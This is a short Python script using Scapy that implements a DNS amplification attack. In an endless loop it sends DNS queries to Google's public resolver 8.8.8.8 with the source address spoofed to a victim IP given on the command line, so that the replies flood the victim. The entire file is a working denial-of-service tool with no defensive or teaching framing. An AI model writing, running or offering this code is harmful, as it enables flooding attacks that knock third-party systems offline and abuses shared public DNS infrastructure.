from scapy.all import *
import sys

class DNSAttacker:
    '''
    DNS Amplification Attack
    '''

    def attack(self, victim_ip):
        while True:
            ip_layer = IP(src=victim_ip, dst='8.8.8.8')
            udp_layer = UDP(dport=53)
            dns_layer = DNS(id=1, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0, nscount=0, arcount=0)
            dns_layer.qd = DNSQR(qname='www.qq.com', qtype=1, qclass=1)
            packet = ip_layer / udp_layer / dns_layer
            send(packet)


if __name__ == "__main__":
    target_ip = sys.argv[1]
    attacker = DNSAttacker()
    attacker.attack(target_ip)

